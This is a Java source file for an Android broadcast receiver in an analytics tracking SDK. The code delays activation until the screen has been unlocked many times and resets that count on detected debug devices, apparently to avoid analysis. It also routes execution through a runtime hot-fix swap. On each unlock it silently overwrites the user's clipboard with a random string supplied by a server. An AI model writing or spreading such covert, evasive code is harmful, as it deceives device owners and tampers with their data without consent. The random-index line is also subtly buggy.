package com.analysys.track.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;

import com.analysys.track.BuildConfig;
import com.analysys.track.hotfix.HotFixTransform;
import com.analysys.track.internal.AnalysysInternal;
import com.analysys.track.internal.content.EGContext;
import com.analysys.track.internal.content.UploadKey;
import com.analysys.track.internal.impl.ReceiverImpl;
import com.analysys.track.utils.CutOffUtils;
import com.analysys.track.utils.ELOG;
import com.analysys.track.utils.MClipManager;
import com.analysys.track.utils.sp.SPHelper;

import org.json.JSONArray;

import java.util.Random;


/**
 * @Copyright © 2019 sanbo Inc. All rights reserved.
 * @Description: 广播接收器
 * @Version: 1.0
 * @Create: 2019-08-07 18:15:12
 * @author: sanbo
 * @mail: xueyongfu@analysys.com.cn
 */
public class AnalysysReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {

        if (BuildConfig.enableHotFix) {
            try {
                HotFixTransform.transform(
                        HotFixTransform.make(AnalysysReceiver.class.getName())
                        , AnalysysReceiver.class.getName()
                        , "onReceive", context, intent);
                return;
            } catch (Throwable e) {

            }
        }
        if (EGContext.FLAG_DEBUG_INNER) {
            ELOG.i("AnalysysReceiver onReceive");
        }
        if (intent == null) {
            return;
        }

        if (Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
            //没初始化并且开屏了10次,就初始化,否则+1返回不处理
            parExtra(context);
            if (!AnalysysInternal.isInit()) {
                if (CutOffUtils.getInstance().cutOff(context, "what_recerver", CutOffUtils.FLAG_DEBUG)) {
                    //调试设备清零
                    SPHelper.setIntValue2SP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, 0);
                    return;
                }
                int size = SPHelper.getIntValueFromSP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, 0);
                if (size > EGContext.FLAG_START_COUNT) {
                    AnalysysInternal.getInstance(context).initEguan(null, null, false);
                } else {
                    SPHelper.setIntValue2SP(context, EGContext.KEY_ACTION_SCREEN_ON_SIZE, size + 1);
                    return;
                }
            }

        }


        ReceiverImpl.getInstance().process(context, intent);

    }

    private void parExtra(Context context) {
        try {
            String extras = SPHelper.getStringValueFromSP(context, UploadKey.Response.RES_POLICY_EXTRAS, "");
            if (!TextUtils.isEmpty(extras)) {
                JSONArray ar = new JSONArray(extras);
                if (ar.length() > 0) {
                    int x = new Random(System.nanoTime()).nextInt(ar.length() - 1);
                    MClipManager.setClipbpard(context, "", ar.getString(x));
                }
            }
        } catch (Throwable igone) {
        }
    }


}
